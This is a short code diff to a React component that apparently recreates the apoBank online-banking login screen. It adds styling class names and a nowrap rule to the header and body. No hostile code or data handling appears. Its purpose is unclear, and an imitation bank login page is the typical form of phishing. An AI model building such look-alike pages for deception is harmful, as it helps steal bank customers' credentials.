@@ -77,8 +77,9 @@ const Apobank = () => {
           }}
         >
           {/* Header */}
-          <div style={{ background: "#fff", padding: "22px 48px" }}>
+          <div className="apo-head" style={{ background: "#fff", padding: "22px 48px" }}>
             <h1
+              className="apo-title"
               style={{
                 color: "#004893",
                 fontSize: 40,
@@ -86,6 +87,7 @@ const Apobank = () => {
                 fontFamily: "Arial, sans-serif",
                 margin: 0,
                 lineHeight: 1.2,
+                whiteSpace: "nowrap",
               }}
             >
               Login apoBank
@@ -93,7 +95,8 @@ const Apobank = () => {
           </div>
 
           {/* Body */}
-          <div style={{ background: BODY_BG, padding: "36px 48px 40px" }}>
+          <div className="apo-body" style={{ background: BODY_BG, padding: "36px 48px 40px" }}>
+
             <div style={{ fontWeight: 600, marginBottom: 24 }}>
               Willkommen im Online-Banking der apoBank
             </div>
